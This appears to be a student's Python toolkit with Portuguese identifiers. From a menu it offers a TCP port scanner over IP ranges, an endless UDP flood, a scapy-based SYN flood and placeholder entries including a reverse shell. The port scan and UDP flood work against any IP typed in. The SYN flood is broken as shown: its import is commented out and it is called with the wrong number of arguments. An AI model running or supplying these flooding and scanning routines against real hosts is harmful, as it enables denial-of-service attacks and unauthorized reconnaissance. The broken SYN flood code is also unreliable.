import os
import socket
import ipaddress
import random
import time
#  from scapy.all import *


def varredura_de_portas(faixa_ips_alvo, porta_inicial, porta_final):
    faixa_ip = ipaddress.IPv4Network(faixa_ips_alvo, strict=False)

    for ip_alvo in faixa_ip:
        portas_abertas = []
        portas_fechadas = 0

        for porta in range(porta_inicial, porta_final + 1):
            soquete = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soquete.settimeout(1)

            resultado = soquete.connect_ex((str(ip_alvo), porta))
            soquete.close()

            if resultado == 0:
                portas_abertas.append(str(porta))
            else:
                portas_fechadas += 1

        print(f"\nResultados para o IP {ip_alvo}:")
        print("Portas abertas: " + ", ".join(portas_abertas))
        print(f"Número de Portas Fechadas: {portas_fechadas}")


def flood_udp(ip_alvo):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)

    sent = 0
    while True:
        sock.sendto(bytes_to_send, (ip_alvo, random.randint(1, 65535)))
        sent += 1
        print(f"Sent {sent} amount of packets to {ip_alvo}")

        # ------------->   Caso queira limitar o número de Pacotes   <--------------
        # if sent >= 100000:
            # print("Parando UDP Flood após 1000 pacotes.")
            # break
        # ------------->   Caso queira limitar o número de Pacotes   <--------------


## Based on "How to Make a SYN Flooding Attack in Python" / "Abdeladim Fadheli" Article - https://thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python --->
def syn_flood(ip_alvo):
    porta_alvo = int(input("Digite a porta alvo: "))
    ip = IP(dst=ip_alvo)
    tcp = TCP(sport=RandShort(), dport=porta_alvo, flags="S")
    raw = Raw(b"X"*1024)
    p = ip / tcp / raw
    send(p, loop=1, verbose=0)
## Based on "How to Make a SYN Flooding Attack in Python" / "Abdeladim Fadheli" Article - https://thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python <---


def Menu_do_Programa():
    os.system('clear')
    print("\nLinguagens de Programação Dinâmicas")
    print("Vinícius Rodrigues\n")
    print("1- Port Scan")
    print("2- UDP Flood")
    print("3- SYN Flood")
    print("4- Análise e Processamento de Ficheiros de Log")
    print("5- Troca de Mensagens")
    print("6- Client Port Knocking")
    print("7- Reverse Shell")
    print("\n0- Sair\n")


def main():
    while True:
        Menu_do_Programa()
        escolha = input("Escolha uma opção: ")
        os.system('clear')
        if escolha == "1":
            print("1- Port Scan\n")
            faixa_ips_alvo = input("Digite o IP(s) alvo (Ex. 192.168.0.1-25): ")
            porta_inicial, porta_final = map(int, input("Digite o intervalo de portas (Ex 1-1000): ").split('-'))
            varredura_de_portas(faixa_ips_alvo, porta_inicial, porta_final)
            input("Pressione Enter para continuar...")
        elif escolha == "2":
            print("2- UDP Flood\n")
            ip_alvo = input("Digite o IP alvo: ")
            flood_udp(ip_alvo)
        elif escolha == "3":
            print("3- SYN Flood\n")
            ip_alvo = input("Digite o IP alvo: ")
            porta_alvo = int(input("Digite a porta alvo: "))
            syn_flood(ip_alvo, porta_alvo)
            input("Pressione Enter para continuar...")
        elif escolha == "4":
            print("Você escolheu a Opção 4")
            input("Pressione Enter para continuar...")
        elif escolha == "5":
            print("Você escolheu a Opção 5")
            input("Pressione Enter para continuar...")
        elif escolha == "6":
            print("Você escolheu a Opção 6")
            input("Pressione Enter para continuar...")
        elif escolha == "7":
            print("Você escolheu a Opção 7")
            input("Pressione Enter para continuar...")
        elif escolha == "0":
            print("Saindo do programa")
            break
        else:
            print("Opção Inválida")
            input("Pressione Enter para continuar...")


if __name__ == "__main__":
    main()
